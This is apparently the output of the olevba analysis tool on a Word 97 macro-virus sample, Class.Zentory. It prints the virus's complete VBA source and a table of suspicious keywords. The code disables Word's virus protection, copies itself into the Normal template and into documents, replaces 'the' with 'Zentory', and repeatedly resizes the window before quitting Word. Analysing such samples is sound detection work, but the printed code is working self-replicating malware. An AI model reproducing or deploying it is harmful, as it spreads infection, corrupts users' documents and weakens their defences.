olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.p-23fa34bcb93cfc0130b6e6d430b9b155514b4bdc
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.p-23fa34bcb93cfc0130b6e6d430b9b155514b4bdc - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()

On Error GoTo 69

Options.VirusProtection = False

Options.SaveNormalPrompt = False

Options.ConfirmConversions = False

xz = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines

zx = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines

If zx > 120 And xz > 0 Then GoTo 69

If zx < 120 Then

    Set xsz = NormalTemplate.VBProject.VBComponents.Item(1)

    ActiveDocument.VBProject.VBComponents.Item(1).Name = xsz.Name

    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\zentory$.ffo"

End If

If xz = 0 Then Set xsz = ActiveDocument.VBProject.VBComponents.Item(1)

Infection = Int(Rnd * 100)

If Infection = 99 Then MsgBox Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(90) + Chr(69) + Chr(78) + Chr(84) + Chr(79) + Chr(82) + Chr(89) + Chr(32) + Chr(66) + Chr(121) + Chr(32) + Chr(86) + Chr(105) + Chr(82) + Chr(117) + Chr(83)

If Application.Build = "8.0.4412" Then Call z2000

xsz.codemodule.AddFromFile ("c:\zentory$.ffo")

With xsz.codemodule

    For x = 1 To 4

    .deletelines 1

    Next x

End With

If zx < 120 Then

    With xsz.codemodule

    .replaceline 1, "Sub AutoClose()"

    .replaceline 123, "Sub ToolsMacro()"

    End With

End If

With xsz.codemodule

    For x = 2 To 122 Step 2

    .replaceline x, "'" & Application.Build & Application.StartupPath & Application.WindowState & Application.FocusInMailHeader & Application.ActiveWindow
    
Next x

End With

69:

If zx > 120 And xz = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName

End Sub

Private Sub z2000()

On Error Resume Next

        Selection.HomeKey Unit:=wdStory

        Selection.Find.ClearFormatting

        Selection.Find.Replacement.ClearFormatting

        With Selection.Find

            .Text = "the"

            .Replacement.Text = "Zentory"

            .Forward = True

            .Wrap = wdFindContinue

            .Format = False

            .MatchCase = False

            .MatchWholeWord = True

            .MatchAllWordForms = False

        End With

        Selection.Find.Execute Replace:=wdReplaceAll

If ActiveDocument.Saved = False Then ActiveDocument.Save

Rpx:

I = I + 1

Application.WindowState = wdWindowStateMinimize

Application.WindowState = wdWindowStateMaximize

If I < 10 Then GoTo Rpx

Application.Quit

End Sub

Sub ViewVBCode()
'Word97/Class.Zentory by Virus,Hi Vic.
End Sub







+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

